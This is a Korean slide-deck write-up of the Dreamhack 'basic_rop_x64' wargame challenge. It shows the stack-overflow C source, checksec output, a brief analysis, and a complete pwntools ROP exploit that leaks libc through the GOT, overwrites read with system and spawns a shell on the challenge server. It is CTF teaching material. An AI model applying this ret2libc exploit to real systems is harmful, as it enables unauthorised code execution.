---
marp: true
---

# 문제 코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

---

# 분석

```sh
[*] '/home/foo1/Desktop/Dreamhack/basic_rop_x64/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/foo1/Desktop/Dreamhack/basic_rop_x64/basic_rop_x64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

x64이고, partial RELRO라서 GOT overwrite가 가능함
또한 PIE도 없어서 매인주소가 고정임

dreamhack rop문제보다 canary가 없어서 오히려 쉬움
바이너리가 다르기 때문에 가젯들 위치 바꾸고 버퍼 크기, 카나리 부분 제거하면 그대로 exploit할 수 있음

---

# Exploit

```python
from pwn import *

#p=process('./basic_rop_x64')
#p=gdb.debug('./basic_rop_x64')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

p=remote('host3.dreamhack.games',13290)
libc=ELF('./libc.so.6')

e=ELF('./basic_rop_x64')
context.log_level='DEBUG'

read_plt=e.plt['read']
read_got=e.got['read']
write_plt=e.plt['write']
pop_rdi=0x0000000000400883
pop_rsi_r15=0x0000000000400881
ret=0x0000000000400819

payload=b'a'*0x40 + b'b'*0x8

# write(1, read_got, ...)
payload+=p64(pop_rdi)
payload+=p64(1)
payload+=p64(pop_rsi_r15)
payload+=p64(read_got)
payload+=p64(0)
payload+=p64(write_plt)

# read(0, read_got, ...)
payload+=p64(pop_rdi)
payload+=p64(0)
payload+=p64(pop_rsi_r15)
payload+=p64(read_got)
payload+=p64(0)
payload+=p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload+=p64(pop_rdi)
payload+=p64(read_got+0x8)
payload+=p64(ret)
payload+=p64(read_plt)

p.send(payload)
p.recvn(0x40)
read=u64(p.recvn(6)+b'\x00'*2)
lb=read-libc.symbols['read']
system=lb+libc.symbols['system']

p.send(p64(system)+b'/bin/sh\x00')

p.interactive()
```
